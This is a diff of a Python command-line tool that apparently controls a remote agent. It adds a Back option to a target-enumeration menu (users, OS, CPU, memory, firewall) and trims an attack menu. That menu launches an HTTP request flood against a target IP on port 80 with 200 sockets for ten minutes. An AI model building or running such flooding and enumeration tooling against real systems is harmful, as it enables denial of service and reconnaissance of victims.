@@ -33,13 +33,15 @@ def connection():
 def enumvalue():
     value = ""
     global ActualValue
-    accepted_command = ["U", "O", "C", "M","F","E"]
+    accepted_command = ["U", "O", "C", "M","F","E","B"]
     print("[U] User Enum \n"
           "[O] OS Enum \n"
           "[C] CPU Enum \n"
           "[M] Memory Enum \n"
           "[F] Firewall Enum \n"
-          "[E] Exit \n")
+          "[E] Exit \n"
+          "[B] Back \n")
+
     type = input("What is your category? \n")[0]
     if accepted_command[0] == type:
         print("1. Username \n"
@@ -67,15 +69,18 @@ def enumvalue():
         value = "1"
     elif accepted_command[5] == type:
         print("Connection Closed")
+    elif accepted_command[6] == type:
+        main()
     else:
         print("Invalid Command")
+        enumvalue()
     ActualValue = type + value
     connection()
     return
 
 def attackcommand():
     value = ""
-    accepted_command = ["1", "O", "C", "M","F","E"]
+    accepted_command = ["1","E"]
     print("[1] HTTP request Flood \n"
           "[E] Exit \n")
     type = input("What is your attack category? \n")[0]
@@ -85,24 +90,6 @@ def attackcommand():
         dos = HTTPRequestDOS(targetIP, 80, socketsCount=200)
         dos.attack(timeout=60 * 10)
     elif accepted_command[1] == type:
-        print("1. Machine Name \n"
-                "2. Machine Version \n"
-                "3. Machine Type \n"
-                "4. Processor \n")
-        value = input("Which value you would like to extract? \n")
-    elif accepted_command[2] == type:
-        print("1. CPU Usage \n"
-              "2. List of Processes \n"
-              "3. List of Services \n")
-        value = input("Which value you would like to extract? \n")
-    elif accepted_command[3] == type:
-        print("1. Memory Status \n"
-              "2. Memory Available \n"
-              "3. Cache Memory ** \n")
-        value = input("Which value you would like to extract? \n")
-    elif accepted_command[4] == type:
-        value = "1"
-    elif accepted_command[5] == type:
         print("Connection Closed")
     else:
         print("Invalid Command")
@@ -163,7 +150,7 @@ def main():
             print("We only accept integer value!")
 
     if main_input == 1:
-        examvalue()
+        enumvalue()
     elif main_input == 2:
         attackcommand()
     else:
